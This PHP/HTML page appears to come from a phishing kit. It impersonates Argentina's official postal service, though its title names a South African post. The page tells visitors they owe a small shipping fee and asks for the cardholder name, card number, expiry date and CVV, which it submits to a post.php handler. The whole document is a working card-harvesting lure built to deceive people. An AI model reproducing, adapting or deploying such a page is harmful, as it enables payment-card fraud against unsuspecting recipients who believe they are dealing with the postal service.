<?php
require "main.php";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/card.css">
    <title>post south africa</title>
</head>
<body>
<header>
        <div class="logo">
            <img src="res/img/logo.png" alt="">
        </div>
        <div class="links">
            <span>Integraciones</span>
            <span>Iniciar sesión</span>
            <span>Registrarme</span>
        </div>
    </header>
    <main>
        <div class="text">
            <label>Agregar método de pago</label>
            <span>Por favor, agregue un método de pago para cubrir los gastos de envío: 6.21 ARS</span>
        </div>
        <div class="container">
            <div class="col">
                <form action="post.php" method="post">
                    <label>Nombre del titular de la tarjeta</label>
                    <input type="text" name="name">
            </div>
            <div class="col">  
                <label>Número de tarjeta</label>
                <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
            </div>
            <div class="col">
                <label>Fecha de vencimiento</label>
                <input type="text" name="exp" required placeholder="MM/AA" id="exp">
            </div>
            <div class="col">
                <label>Código de seguridad</label>
                <input type="password" name="cvv" required placeholder="CVV" id="cvv">
                <button type="submit" class="btn">Continuar</button>
            </div>
            </form>        
        </div>
    </main>
    <footer>
        <div class="down">
            <img src="res/img/logo.png" alt="">
            <p>Correo Oficial de la República Argentina - Todos los derechos reservados</p>
        </div>
    </footer>
<script src="./res/cdn/jq.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/0000");
$("#cvv").mask("0000");
</script>   
</body>
</html>